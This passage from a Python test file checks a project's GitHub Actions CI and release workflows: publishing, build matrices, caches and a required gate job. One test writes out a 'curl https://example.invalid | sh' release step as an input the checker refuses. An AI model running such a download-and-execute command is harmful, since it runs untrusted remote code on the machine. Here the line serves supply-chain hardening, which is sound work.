    (command,) = [step["run"] for step in publish["steps"] if "ci/release/command.py" in step.get("run", "")]
    assert "--product ${{ matrix.product }}" in command
    (checking,) = [step["run"] for step in workflow["jobs"]["check"]["steps"] if "asymptote check" in step.get("run", "")]
    assert checking == "asymptote check --root ${{ matrix.root || format('crates/{0}', inputs.product) }} --groups ${{ matrix.group }}"
    # Every product's release tools, one job per group: each group a product's asymptote.toml names beside lint, check, perf and
    # build is a row of the matrix, and every row is a group some product names, or the root's `repository`.
    released = {
        tool["group"]
        for manifest in listed(ROOT, "crates/*/asymptote.toml")
        for tool in tomllib.loads(read(manifest))["tools"]
        if tool["group"].startswith("release")
    }
    rows = workflow["jobs"]["check"]["strategy"]["matrix"]["include"]
    assert {row["group"] for row in rows} == released | {"repository", "lint", "clippy", "api", "check"}
    # A hand run's check, the pull request gate's rows for its product: its lint, the tests on every machine, and the root's
    # `repository` group from the root, the one row with a root of its own.
    assert [(row["group"], row.get("root")) for row in rows if "root" in row or row["group"] in {"lint", "repository"}] == [
        ("repository", "."),
        ("lint", None),
    ]
    assert sorted(row["runner"] for row in rows if row["group"] == "check") == sorted(
        ["ubuntu-26.04", "ubuntu-26.04-arm", "macos-26", "windows-2025"]
    )
    assert [row["runner"] for row in rows if row["group"] == "api"] == ["macos-26"]
    # The tests on every machine the products ship to; every other group once, on Linux.
    assert sorted(row["runner"] for row in rows if row["group"] == "release-tests") == sorted(
        ["ubuntu-26.04", "ubuntu-26.04-arm", "macos-26", "windows-2025"]
    )
    assert all(row["runner"] == "ubuntu-26.04" for row in rows if row["group"] not in {"release-tests", "check", "api"})
    assert len(rows) == len({(row["runner"], row["group"]) for row in rows})
    (uploading,) = [step for step in publish["steps"] if "CARGO_REGISTRY_TOKEN" in step.get("env", {})]
    # Trusted publishing only: crates.io's token is the one its auth action exchanged, and no step reads a secret.
    assert uploading["env"]["CARGO_REGISTRY_TOKEN"] == "${{ env.PUBLISH == 'true' && steps.crates-io.outputs.token || '' }}"
    (auth,) = [step for step in publish["steps"] if step.get("uses", "").startswith("rust-lang/crates-io-auth-action@")]
    assert auth["if"] == "env.PUBLISH == 'true'"
    assert "secrets." not in read(DIRECTORY / "release.yml")
    assert publish["permissions"]["id-token"] == "write"
    # npm's trusted publishing needs npm 11.5.1 or later, which the latest Node 24 bundles.
    (node,) = [step for step in publish["steps"] if step.get("uses", "").startswith("actions/setup-node@")]
    assert node["with"]["node-version"] == 24 and node["with"]["check-latest"] is True
    (release,) = [step for step in publish["steps"] if step.get("name") == RELEASE_STEP]
    assert release["if"] == "env.PUBLISH == 'true'"


def test_the_release_builds_every_target_in_one_matrix_whose_rows_run_the_same_steps() -> None:
    workflow = yaml.safe_load(read(DIRECTORY / "release.yml"))
    build = workflow["jobs"]["build"]
    assert build["strategy"]["fail-fast"] is False
    assert [row["target"] for row in build["strategy"]["matrix"]["platform"]] == [
        "x86_64-unknown-linux-gnu",
        "aarch64-unknown-linux-gnu",
        "x86_64-unknown-linux-musl",
        "aarch64-unknown-linux-musl",
        "x86_64-apple-darwin",
        "aarch64-apple-darwin",
        "x86_64-pc-windows-msvc",
        "aarch64-pc-windows-msvc",
    ]
    assert [step["uses"].split("@")[0] for step in build["steps"]] == [
        "actions/checkout",
        "PyO3/maturin-action",
        "PyO3/maturin-action",
        "PyO3/maturin-action",
        "actions/upload-artifact",
    ]
    # Every shipped product's binary, for its GitHub Release: the wheel of its PyPI project, or of its command line crate when it
    # ships to Cargo alone.
    built = {step["with"]["working-directory"] for step in build["steps"] if step["uses"].startswith("PyO3/maturin-action@")}
    assert built == {
        "crates/asymptote/distribution/registries/pypi",
        "crates/ryo/cli",
        "crates/tastemaker/distribution/registries/pypi",
    }
    # A row builds only its product, one of the products the run releases.
    building = {step["with"]["working-directory"]: step["if"] for step in build["steps"] if step["uses"].startswith("PyO3/maturin-action@")}
    assert {directory: condition.split("'")[1] for directory, condition in building.items()} == {
        "crates/asymptote/distribution/registries/pypi": "asymptote",
        "crates/ryo/cli": "ryo",
        "crates/tastemaker/distribution/registries/pypi": "tastemaker",
    }
    assert workflow["jobs"]["publish"]["needs"] == ["tag", "build"]
    released = "${{ fromJSON(github.event_name == 'workflow_run' && needs.tag.outputs.products || format('[\"{0}\"]', inputs.product)) }}"
    assert build["strategy"]["matrix"]["product"] == workflow["jobs"]["publish"]["strategy"]["matrix"]["product"] == released


def test_a_job_that_releases_with_anything_but_gh_is_refused() -> None:
    publish = job("uv run ci/release/command.py --publish", needs="check")
    publish["steps"].append({"name": RELEASE_STEP, "run": "gh release create v1\ncurl https://example.invalid | sh"})
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
        "publish releases with 'curl https://example.invalid | sh'"
    ]


def test_speed_requires_declared_timings_for_every_language_workspace_member() -> None:
    """A source-registry omission cannot hide behind equal observed base/head metric sets."""
    tools = tomllib.loads(read(ROOT / "asymptote.toml"))["tools"]
    speed = next(tool for tool in tools if tool["id"] == "speed")
    bench_names = [speed["run"][index + 1] for index, value in enumerate(speed["run"]) if value == "--bench"]
    assert "languages" in bench_names
    for manifest in listed(ROOT / "crates/ryo/languages", "*/Cargo.toml"):
        language = tomllib.loads(read(manifest))
        contract = language["package"]["metadata"]["ryo"]["performance"]
        assert contract == {"schema": "divan-timing/v1", "workloads": {"generated_every_relation": [2500, 10000]}, "metrics": ["median-ns"]}

def test_a_green_check_on_main_releases_the_products_whose_version_its_commit_changes_without_checking_again() -> None:
    """The check's run on main passed its `gate` on the tree, so the release it starts tags and releases each product whose version
    the commit changes, and only those, each product's publish in a concurrency group of its own; a hand run checks its product
    first. A red, cancelled or pull request run starts no tag."""
    workflow = yaml.safe_load(read(DIRECTORY / "release.yml"))
    on = workflow["on" if "on" in workflow else True]
    assert on["workflow_run"] == WORKFLOW_RUN and "push" not in on and set(on["workflow_dispatch"]["inputs"]) == {"product", "publish"}
    jobs = workflow["jobs"]
    assert "concurrency" not in workflow
    tag = jobs["tag"]
    assert tag["if"] == (
        "github.event_name == 'workflow_run' && github.event.workflow_run.event == 'push' && github.event.workflow_run.conclusion == 'success'"
    )
    assert tag["permissions"] == {"contents": "write"}
    # Every job that reads the tree reads the commit the check ran on, not the branch's newest.
    for name in ("tag", "build", "publish"):
        (checkout,) = [step for step in jobs[name]["steps"] if step.get("uses", "").startswith("actions/checkout@")]
        assert checkout["with"]["ref"] == "${{ github.event.workflow_run.head_sha || github.sha }}", name
    assert [step["run"] for step in tag["steps"] if "run" in step] == ["uv run ci/tag/command.py --push"]
    assert tag["outputs"]["products"] == "${{ steps.tag.outputs.products }}"
    assert jobs["check"]["if"] == "github.event_name == 'workflow_dispatch'"
    assert jobs["build"]["needs"] == ["tag", "check"]
    assert jobs["build"]["if"].startswith("${{ !cancelled() && !failure() && ")
    assert "needs.tag.result == 'success' && needs.tag.outputs.products != '[]'" in jobs["build"]["if"]
    publish = jobs["publish"]
    assert publish["if"] == "${{ !cancelled() && needs.build.result == 'success' }}"
    assert publish["concurrency"] == {"group": "release-${{ matrix.product }}", "cancel-in-progress": False}
    # One publish at a time, in the `tag` job's order: ryo's crates are on crates.io before tastemaker's publish starts.
    assert publish["strategy"]["max-parallel"] == 1
    assert PRODUCTS.index("ryo") < PRODUCTS.index("tastemaker")
    # Each build row's artifact is named for its product, and a publish downloads its product's alone, a directory per target.
    (upload,) = [step for step in jobs["build"]["steps"] if step["uses"].startswith("actions/upload-artifact@")]
    assert upload["with"]["name"] == "${{ matrix.product }}-${{ matrix.platform.target }}"
    (download,) = [step for step in publish["steps"] if step.get("uses", "").startswith("actions/download-artifact@")]
    assert download["with"] == {"pattern": "${{ matrix.product }}-*", "merge-multiple": True, "path": "dist"}


# The groups a pull request runs for each product on Linux x86, in one asymptote call so that its tools share one build.
LINUX_GROUPS = ("lint", "clippy", "check", "release-tests", "release-coverage", "memory")
EVERY_PRODUCT = "${{ fromJSON(github.event_name == 'workflow_dispatch' && format('[\"{0}\"]', inputs.product) || '" + "[" + ",".join(
    f'"{product}"' for product in PRODUCTS
) + "]') }}"
GATED = ["root", "pull-request", "check-linux", "check", "speed", "python-release", "bench-correctness"]
# A pull request runs Linux x86 alone, the fewest builds: `check-linux`, the root's and the title's jobs and the bench. The jobs that
# run on main alone (the other machines and groups, the Python release build) are skipped on a pull request, which the gate lets
# pass; the speed guard compares with origin/main, so only a hand run runs it, and the gate lets it skip everywhere else.
NOT_ON_A_PULL_REQUEST = "github.event_name != 'pull_request'"
CONDITIONS = {"check": NOT_ON_A_PULL_REQUEST, "python-release": NOT_ON_A_PULL_REQUEST, "speed": "github.event_name == 'workflow_dispatch'"}
ALLOWED_SKIPS = "${{ github.event_name == 'pull_request' && 'check,speed,python-release' || github.event_name == 'push' && 'speed' || '' }}"


def gate_problems(workflow: dict) -> list[str]:
    """What keeps check.yml from checking every product behind one gate, with asymptote alone deciding what runs: a job beside
    the gated ones and the gate (a `changes` job, a paths filter), a job that waits for one, a product list but every product's
    (a hand run's one), a merge to main that cancels the run seeding the stores, a gate that misses a job or lets one skip but
    the jobs that run on main alone, where they do not run."""
    found = []
    jobs = workflow["jobs"]
    if set(jobs) != {*GATED, "gate"}:
        found.append(f"check.yml runs {sorted(jobs)}, not {sorted([*GATED, 'gate'])}")
    found += [f"{name} waits for {needs(job)}" for name, job in jobs.items() if name != "gate" and needs(job)]
    found += [f"{name} is skipped when {job.get('if')}" for name, job in jobs.items() if name != "gate" and job.get("if") != CONDITIONS.get(name)]
    for name in ("check-linux", "check"):
        if jobs.get(name, {}).get("strategy", {}).get("matrix", {}).get("product") != EVERY_PRODUCT:
            found.append(f"{name} must run every product, a hand run's one")
    if workflow.get("concurrency", {}).get("cancel-in-progress") != "${{ github.event_name != 'push' }}":
        found.append("a merge to main must never cancel the run seeding the stores")
    gate = jobs.get("gate", {})
    if gate.get("if") != "always()" or needs(gate) != GATED:
        found.append(f"gate must wait for {GATED}, whatever their results")
    steps = gate.get("steps", [{}])
    if len(steps) != 1 or steps[0].get("with") != {"jobs": "${{ toJSON(needs) }}", "allowed-skips": ALLOWED_SKIPS}:
        found.append("gate may let only the jobs that run on main alone skip, and only where they do not run")
    return found


def test_a_pull_request_or_hand_run_checks_every_product_behind_one_gate() -> None:
    """A pull request to main and a push to main check every product, and a hand run the one product it names: each one's whole
    check fan-out, the rows release.yml checks a hand run with but the root row, which the `root` job runs. Asymptote's stores,
    not a paths filter, decide what runs. One `gate` job fails when a job failed or was cancelled and passes when each succeeded,
    or was skipped when only the speed guard was, on a push."""
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    on = workflow["on" if "on" in workflow else True]
    assert set(on) == {"pull_request", "push", "workflow_dispatch"}
    assert on["pull_request"] == PULL_REQUEST and "edited" in on["pull_request"]["types"]
    assert on["push"] == {"branches": ["main"]}
    assert on["workflow_dispatch"]["inputs"] == {
        "product": {
            "description": "The one product this run checks",
            "type": "choice",
            "required": True,
            "options": list(PRODUCTS),
        }
    }
    assert workflow["concurrency"]["group"] == (
        "check-${{ github.event.pull_request.number || (github.event_name == 'push' && github.sha) || github.ref }}-${{ inputs.product }}"
    )
    assert workflow["env"] == {"NEXTEST_PROFILE": "ci"}
    assert gate_problems(workflow) == []
    assert sorted(path.parent.name for path in listed(ROOT, "crates/*/Cargo.toml")) == sorted(PRODUCTS)
    jobs = workflow["jobs"]
    linux, check = jobs["check-linux"], jobs["check"]
    assert linux["runs-on"] == "ubuntu-26.04"
    (linux_checking,) = [step["run"] for step in linux["steps"] if "asymptote check" in step.get("run", "")]
    assert linux_checking == "asymptote check --root crates/${{ matrix.product }} --groups " + ",".join(LINUX_GROUPS)
    (checking,) = [step["run"] for step in check["steps"] if "asymptote check" in step.get("run", "")]
    assert checking == "asymptote check --root crates/${{ matrix.product }} --groups ${{ matrix.check.groups }}"
    # The same machines and groups as the release's check, split in two: the pull request's Linux job, which every event runs, and
    # the rows a push to main and a hand run add, a row's groups sharing one asymptote call and so one build.
    release = yaml.safe_load(read(DIRECTORY / "release.yml"))["jobs"]["check"]["strategy"]["matrix"]["include"]
    here = {("ubuntu-26.04", group) for group in LINUX_GROUPS} | {
        (row["runner"], group) for row in check["strategy"]["matrix"]["check"] for group in row["groups"].split(",")
    }
    assert here == {(row["runner"], row["group"]) for row in release if row.get("root") != "."}
    assert [row for row in release if row.get("root") == "."] == [{"runner": "ubuntu-26.04", "group": "repository", "root": "."}]
    rows = check["strategy"]["matrix"]["check"]
    assert len(rows) == len({(row["runner"], row["label"]) for row in rows})
    # A row seeds the Rust cache when it is the one of its machine that builds what the others there restore.
    assert sorted((row["runner"], row["groups"]) for row in rows if row["save"]) == sorted(
        [("ubuntu-26.04-arm", "check,release-tests"), ("macos-26", "check,release-tests"), ("windows-2025", "check,release-tests")]
    )
    assert {row["label"] for row in rows if not row["store"]} == set(UNSTORED_GROUPS)
    # One Rust cache per machine and product, shared by the groups run there and with no job id in its key, saved by main alone; and
    # the installed tools, restored by every run and saved by main alone when the restore missed.
    for each, saved in ((linux, MAIN), (check, f"{MAIN} && matrix.check.save")):
        (cache,) = [step for step in each["steps"] if step.get("uses", "").startswith("Swatinem/rust-cache@")]
        assert cache["with"]["shared-key"] == "${{ runner.os }}-${{ runner.arch }}-${{ matrix.product }}"
        assert cache["with"]["add-job-id-key"] is False and cache["with"]["save-if"] == "${{ " + saved + " }}"
        (restore,) = [step for step in each["steps"] if step.get("id") == "cargo_bin_cache"]
        (save,) = [step for step in each["steps"] if step.get("name") == "Save the installed tools"]
        assert restore["with"]["key"] == save["with"]["key"] and "github.sha" not in save["with"]["key"]
        assert save["if"] == f"{MAIN} && steps.cargo_bin_cache.outputs.cache-hit != 'true'"
    (released,) = [step for step in release_check()["steps"] if step.get("uses", "").startswith("Swatinem/rust-cache@")]
    assert released["with"]["shared-key"] == "${{ matrix.runner }}-${{ matrix.group }}-${{ inputs.product }}"
    # The release's setup, and around the check its asymptote store, the saved tools and the upload of what its tools left.
    for each in (linux, check):
        stored = {index for index, _ in store_steps(each)}
        saved_tools = {index for index, step in enumerate(each["steps"]) if step.get("name") == "Save the installed tools"}
        assert [
            step["uses"].split("@")[0].replace("actions/cache/restore", "actions/cache")  # the tools' restore, saved apart
            for index, step in enumerate(each["steps"])
            if "uses" in step and not step["uses"].startswith(UPLOAD) and index not in stored | saved_tools
        ] == [step["uses"].split("@")[0] for step in release_check()["steps"] if "uses" in step]
    (deciding,) = jobs["gate"]["steps"]
    assert deciding["uses"].startswith("re-actors/")


@pytest.mark.parametrize(
    "change",
    [
        pytest.param(
            lambda workflow: workflow["jobs"].update(
                {"changes": {"steps": [{"uses": "dorny/paths-filter@ceb8a2b8f2d89434be7ff52d3de7ec3738c5cc9d"}]}}
            ),
            id="paths-filter-job",
        ),
        pytest.param(lambda workflow: workflow["jobs"]["check"].update({"needs": "root"}), id="check-waits"),
        pytest.param(lambda workflow: workflow["jobs"]["python-release"].update({"if": "false"}), id="python-release-skipped"),
        pytest.param(lambda workflow: workflow["jobs"]["speed"].pop("if"), id="speed-on-a-push"),
        pytest.param(lambda workflow: workflow["jobs"]["check"].pop("if"), id="the-other-machines-on-a-pull-request"),
        pytest.param(lambda workflow: workflow["jobs"]["check-linux"].update({"if": "false"}), id="check-linux-skipped"),
        pytest.param(lambda workflow: workflow.update({"concurrency": {**workflow["concurrency"], "cancel-in-progress": True}}), id="a-merge-cancels-the-seed"),
        pytest.param(
            lambda workflow: workflow["jobs"]["check"]["strategy"]["matrix"].update({"product": '["ryo"]'}), id="one-product"
        ),
        pytest.param(lambda workflow: workflow["jobs"]["gate"]["needs"].remove("speed"), id="gate-drops-speed"),
        pytest.param(
            lambda workflow: workflow["jobs"]["gate"]["steps"][0]["with"].update({"allowed-skips": "speed"}), id="speed-skippable-always"
        ),
        pytest.param(
            lambda workflow: workflow["jobs"]["gate"]["steps"][0]["with"].update({"allowed-skips": "bench-correctness"}),
            id="bench-skippable",
        ),
    ],
)
def test_the_gate_refuses_a_paths_filter_a_cancelled_seed_and_a_skip(change) -> None:
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    change(workflow)
    assert gate_problems(workflow)


def test_root_runs_only_the_repository_s_own_groups_on_every_event() -> None:
    """The root's repository and repository-check groups run on every run, a hand run's too: groups no product has, so the root
    job runs no product's tools, and each product's lint group runs in its `check-linux` job."""
    jobs = yaml.safe_load(read(DIRECTORY / "check.yml"))["jobs"]
    root = jobs["root"]
    assert "if" not in root and "needs" not in root
    assert [step["run"] for step in root["steps"] if "asymptote check" in step.get("run", "")] == [
        "asymptote check --root . --groups repository,repository-check"
    ]
    assert "lint" in LINUX_GROUPS and any(step.get("run", "").endswith("--groups " + ",".join(LINUX_GROUPS)) for step in jobs["check-linux"]["steps"])
    # A check at the root runs every member's tools of the groups it names: the root's groups are its own, so it runs none of them.
    root_groups = {tool["group"] for tool in tomllib.loads(read(ROOT / "asymptote.toml"))["tools"]}
    assert {"repository", "repository-check"} <= root_groups
    for manifest in listed(ROOT, "crates/*/asymptote.toml"):
        assert not root_groups & {tool["group"] for tool in tomllib.loads(read(manifest))["tools"]}, manifest


def python_release_covered(workflow: dict) -> bool:
    """The Python release-build test has a real Linux runner, runs on every run but a pull request's (the release build is main's)
    and is required by the gate."""
    jobs = workflow["jobs"]
    job = jobs.get("python-release")
    if job is None:
        return False
    return (
        "needs" not in job
        and job.get("if") == NOT_ON_A_PULL_REQUEST
        and job.get("runs-on") == "ubuntu-26.04"
        and [step["run"] for step in job["steps"] if "asymptote check" in step.get("run", "")]
        == ["asymptote check --root crates/ryo --groups python-release"]
        and "python-release" in jobs["gate"]["needs"]
    )


def test_python_release_guard_cannot_be_orphaned_by_product_selection() -> None:
    tools = tomllib.loads(read(ROOT / "crates/ryo/asymptote.toml"))["tools"]
    assert any(tool["id"] == "correctness-python-release-build" and tool["group"] == "python-release" for tool in tools)
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    assert python_release_covered(workflow)
    missing = deepcopy(workflow)
    missing["jobs"].pop("python-release")
    detached = deepcopy(workflow)
    detached["jobs"]["gate"]["needs"].remove("python-release")
    skipped = deepcopy(workflow)
    skipped["jobs"]["python-release"]["if"] = "false"
    waiting = deepcopy(workflow)
    waiting["jobs"]["python-release"]["needs"] = "root"
    wrong_group = deepcopy(workflow)
    command = next(step for step in wrong_group["jobs"]["python-release"]["steps"] if "asymptote check" in step.get("run", ""))
    command["run"] = "asymptote check --root crates/ryo --groups check"
    assert all(not python_release_covered(changed) for changed in (missing, detached, skipped, waiting, wrong_group))


def bench_correctness_required(workflow: dict) -> bool:
    """The gate waits for bench-correctness and never lets it skip."""
    gate = workflow["jobs"]["gate"]
    return "bench-correctness" in needs(gate) and "bench-correctness" not in gate["steps"][0]["with"]["allowed-skips"].split(", ")


def test_bench_correctness_is_required_by_the_gate() -> None:
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    assert bench_correctness_required(workflow)
    dropped = deepcopy(workflow)
    dropped["jobs"]["gate"]["needs"].remove("bench-correctness")
    skippable = deepcopy(workflow)
    skippable["jobs"]["gate"]["steps"][0]["with"]["allowed-skips"] += ", bench-correctness"
    assert not bench_correctness_required(dropped) and not bench_correctness_required(skippable)


def test_rust_build_caches_keep_each_product_and_profile_separate() -> None:
    def one_workspace(cache: dict, source: str) -> bool:
        return cache.get("workspaces", "").splitlines() == [f"{source} -> ../../target"]

    jobs = yaml.safe_load(read(DIRECTORY / "check.yml"))["jobs"]
    keys = set()
    for name in ("check-linux", "check", "speed", "python-release", "bench-correctness"):
        cache = next(step for step in jobs[name]["steps"] if step.get("uses", "").startswith("Swatinem/rust-cache@"))["with"]
        assert "prefix-key" not in cache
        assert cache["cache-workspace-crates"] is True
        shared = name in {"check-linux", "check"}
        assert one_workspace(cache, "crates/${{ matrix.product }}" if shared else "crates/ryo")
        # Saved by main alone, under a key with no job id; the matrix's rows save where `save` says (one row of each machine).
        assert cache["add-job-id-key"] is False and cache["cache-on-failure"] is True
        assert cache["save-if"] == "${{ " + MAIN + (" && matrix.check.save" if name == "check" else "") + " }}"
        # The machine's one key, shared by the groups run there: Linux x86's `check-linux` and the matrix's rows; the other jobs
        # build another profile or workspace and keep a key of their own.
        assert cache["shared-key"] == ("${{ runner.os }}-${{ runner.arch }}-${{ matrix.product }}" if shared else f"ubuntu-26.04-{name}-ryo")
        keys.add(cache["shared-key"])
    assert len(keys) == 4
    duplicate_target = deepcopy(cache)
    duplicate_target["workspaces"] += "\ncrates/asymptote -> ../../target"
    assert not one_workspace(duplicate_target, "crates/ryo")
    release = next(step for step in release_check()["steps"] if step.get("uses", "").startswith("Swatinem/rust-cache@"))["with"]
    assert "prefix-key" not in release
    assert release["cache-workspace-crates"] is True
    assert one_workspace(release, "crates/${{ inputs.product }}")
    assert release["shared-key"] == "${{ matrix.runner }}-${{ matrix.group }}-${{ inputs.product }}"


def release_check() -> dict:
    """release.yml's check job, whose steps the pull request gate's checking jobs repeat."""
    return yaml.safe_load(read(DIRECTORY / "release.yml"))["jobs"]["check"]


def test_a_hand_run_opens_one_product_s_release_pull_request_after_its_lint_and_starts_its_check() -> None:
    """The release pull request workflow starts only by hand, for the one product its input names: the product's lint group, then
    the one job command that opens the pull request with release-plz and starts check.yml on its branch, with the workflow's own
    token and the permissions that takes alone."""
    workflow = yaml.safe_load(read(DIRECTORY / "release-pr.yml"))
    on = workflow["on" if "on" in workflow else True]
    assert set(on) == {"workflow_dispatch"}
    (product,) = on["workflow_dispatch"]["inputs"].values()
    assert product["type"] == "choice" and product["required"] is True and product["options"] == list(PRODUCTS)
    assert workflow["permissions"] == {"contents": "read"}
    jobs = workflow["jobs"]
    assert set(jobs) == {"check", "release_pr"}
    (checking,) = [step["run"] for step in jobs["check"]["steps"] if "asymptote check" in step.get("run", "")]
    assert checking == "asymptote check --root crates/${{ inputs.product }} --groups lint"
    release_pr = jobs["release_pr"]
    assert release_pr["needs"] == "check"
    assert release_pr["permissions"] == {"contents": "write", "pull-requests": "write", "actions": "write"}
    (command,) = [step for step in release_pr["steps"] if "ci/release_pr/command.py" in step.get("run", "")]
    assert command["run"] == "uv run ci/release_pr/command.py --product ${{ inputs.product }}"
    assert command["env"] == {"GH_TOKEN": "${{ github.token }}"}
    assert "secrets." not in read(DIRECTORY / "release-pr.yml")
    # release-plz opens the pull request alone: no publish, no tag and no GitHub Release, for every product.
    for name in PRODUCTS:
        configuration = tomllib.loads(read(ROOT / "crates" / name / "release-plz.toml"))["workspace"]
        assert {key: configuration[key] for key in ("publish", "git_tag_enable", "git_release_enable")} == {
            "publish": False,
            "git_tag_enable": False,
            "git_release_enable": False,
        }
        assert configuration["pr_name"] == f"chore({name}): release {{{{ version }}}}"


def test_the_bench_correctness_job_is_an_independent_complete_gate() -> None:
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    assert bench_correctness_problems(workflow["jobs"]["bench-correctness"]) == []
    assert problems(workflow) == []


def _altered_bench_correctness(change) -> dict:
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    altered = deepcopy(workflow)
    change(altered["jobs"]["bench-correctness"])
    return altered


def _check_step(job: dict) -> dict:
    return next(step for step in job["steps"] if step.get("run") == BENCH_CORRECTNESS_CHECK)


@pytest.mark.parametrize(
    "change",
    [
        pytest.param(lambda job: job.__setitem__("if", False), id="job-if-false"),
        pytest.param(lambda job: job.__setitem__("continue-on-error", True), id="job-continue-on-error"),
        pytest.param(lambda job: _check_step(job).__setitem__("if", False), id="step-if-false"),
        pytest.param(lambda job: _check_step(job).__setitem__("continue-on-error", True), id="step-continue-on-error"),
        pytest.param(lambda job: _check_step(job).__setitem__("run", BENCH_CORRECTNESS_CHECK + " || true"), id="masked-exit"),
        pytest.param(lambda job: _check_step(job).__setitem__("run", "asymptote check --root crates/ryo --groups lint"), id="other-group"),
        pytest.param(lambda job: _check_step(job).__setitem__("shell", "bash +e {0}"), id="shell-override"),
        pytest.param(lambda job: job.__setitem__("timeout-minutes", 360), id="no-headroom"),
        pytest.param(lambda job: job["env"].pop("RAYON_NUM_THREADS"), id="lost-environment"),
        pytest.param(lambda job: job["steps"][-1].pop("if"), id="upload-skipped-on-failure"),
        pytest.param(lambda job: job["steps"][-1]["with"].__setitem__("if-no-files-found", "warn"), id="receipts-optional"),
        pytest.param(lambda job: job.__setitem__("container", "example.invalid/custom:latest"), id="container"),
    ],
)
def test_bench_correctness_refuses_skips_masks_and_dropped_receipts(change) -> None:
    assert problems(_altered_bench_correctness(change))


def test_the_bench_correctness_job_runs_its_one_group() -> None:
    """The job runs ryo's bench-correctness group, once: a matrix re-added, or the check pointed at another group, is refused."""
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    tools = tomllib.loads(read(ROOT / "crates/ryo/asymptote.toml"))["tools"]
    assert BENCH_CORRECTNESS_GROUP in {tool["group"] for tool in tools}
    assert bench_correctness_problems(workflow["jobs"]["bench-correctness"]) == []
    matrix = deepcopy(workflow["jobs"]["bench-correctness"])
    matrix["strategy"] = {"fail-fast": False, "matrix": {"group": ["bench-correctness", "bench-cases"]}}
    other_group = deepcopy(workflow["jobs"]["bench-correctness"])
    _check_step(other_group)["run"] = "asymptote check --root crates/ryo --groups bench-cases"
    for changed in (matrix, other_group):
        assert bench_correctness_problems(changed)


def store_of(job: dict, path: str, key: str) -> list[dict]:
    """The restore and the save of an asymptote store, as a job keeps them."""
    return [
        {"uses": RESTORE + "0" * 40, "with": {"path": path, "key": key, "restore-keys": key.split("${{ github.run_id }}")[0] + "\n"}},
        *job["steps"],
        {"name": "Save the asymptote store", "if": f"always() && {MAIN}", "uses": SAVE + "0" * 40, "with": {"path": path, "key": key}},
    ]


def test_a_job_saves_only_its_asymptote_store_after_its_check() -> None:
    """A job that keeps a store restores it before its check and saves it after, a failed check too, under its machine,
    product, group and the pins of the installed tools, the toolchains and the helpers; check.yml's jobs keep one each but the
    bench jobs and speed, and nothing else is saved after a check."""
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    assert {name for name, job in workflow["jobs"].items() if store_steps(job)} == {"root", "check-linux", "check", "python-release"}
    for path in WORKFLOWS:
        for name, defined in yaml.safe_load(read(path))["jobs"].items():
            assert store_problems(name, defined) == [], (path.name, name)
    key = f"asymptote-${{{{ runner.os }}}}-${{{{ runner.arch }}}}-ryo-check-{TOOLHASH}-${{{{ github.run_id }}}}-${{{{ github.run_attempt }}}}"
    kept = {"steps": store_of(job("asymptote check --root crates/ryo --groups check"), "crates/ryo/.asymptote/cache", key)}
    assert store_problems("check", kept) == [] and problems({"jobs": {"check": kept}}) == []
    unsaved_on_failure = deepcopy(kept)
    unsaved_on_failure["steps"][-1].pop("if")
    other_path = deepcopy(kept)
    other_path["steps"][-1]["with"]["path"] = other_path["steps"][0]["with"]["path"] = "target"
    no_pins = deepcopy(kept)
    no_pins["steps"][-1]["with"]["key"] = no_pins["steps"][0]["with"]["key"] = key.replace(TOOLHASH, "${{ hashFiles('tools/install.py') }}")
    other_key = deepcopy(kept)
    other_key["steps"][0]["with"]["key"] = key.replace("-check-", "-lint-")
    saved_first = deepcopy(kept)
    saved_first["steps"].insert(0, saved_first["steps"].pop())
    for changed in (unsaved_on_failure, other_path, no_pins, other_key, saved_first):
        assert store_problems("check", changed) or problems({"jobs": {"check": changed}})
    # After the check and the save, only an upload: anything else is refused.
    trailing = deepcopy(kept)
    trailing["steps"].append({"run": "echo done"})
    assert problems({"jobs": {"check": trailing}}) == ["check does not end in its asymptote check step"]


def exact(version: object) -> bool:
    """Whether a setup action's version is exact: a full x.y.z, or an expression choosing among full x.y.z by platform."""
    text = str(version)
    chosen = re.findall(r"'([^']*)'", text) if text.startswith("${{") else [text]
    return bool(chosen) and all(re.fullmatch(r"\d+\.\d+\.\d+", each) for each in chosen if not each.startswith(("Linux", "macOS", "Windows")))

def test_a_workflow_change_misses_the_store() -> None:
    """The store key hashes this workflow, which pins every toolchain exactly, the helper scripts and the Rust toolchain: a
    change to any of them opens an empty store. A key that leaves the workflow out is refused."""
    for each in (".github/workflows/check.yml", "ci/scripts/**", "rust-toolchain.toml", "tools/install.py", "asymptote.toml"):
        assert f"'{each}'" in TOOLHASH
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    for name, defined in workflow["jobs"].items():
        for step in defined["steps"]:
            action = step.get("uses", "").split("@")[0]
            if action in PINNED:
                assert exact(step.get("with", {}).get(PINNED[action], "")), (name, action)
    stored = deepcopy(workflow["jobs"]["root"])
    for _, step in store_steps(stored):
        for field in ("key", "restore-keys"):
            if field in step["with"]:
                step["with"][field] = step["with"][field].replace(", '.github/workflows/check.yml'", "")
    assert store_problems("root", stored)
    floating = deepcopy(workflow)
    next(step for step in floating["jobs"]["root"]["steps"] if step.get("uses", "").startswith("actions/setup-node@"))["with"]["node-version"] = 24
    assert any(
        not exact(step.get("with", {}).get("node-version", ""))
        for step in floating["jobs"]["root"]["steps"]
        if step.get("uses", "").startswith("actions/setup-node@")
    )
    assert not exact("${{ runner.os == 'Linux' && '3.12.16' || '3.12' }}") and exact("${{ runner.os == 'Linux' && '3.12.16' || '3.12.10' }}")


def test_a_group_whose_answer_stands_outside_the_repository_keeps_no_store() -> None:
    """release-resolution (crates.io's live index), api (the newest release tag) and speed (origin/main) restore no store, so a
    stored pass never outlives the state it was judged on; a row restored anyway is refused."""
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    rows = {row["label"] for row in workflow["jobs"]["check"]["strategy"]["matrix"]["check"]}
    assert set(UNSTORED_GROUPS) <= rows
    assert not store_steps(workflow["jobs"]["speed"])
    check = workflow["jobs"]["check"]
    assert store_problems("check", check) == []
    for _, step in store_steps(check):
        assert UNSTORED in step["if"]
    restored = deepcopy(check)
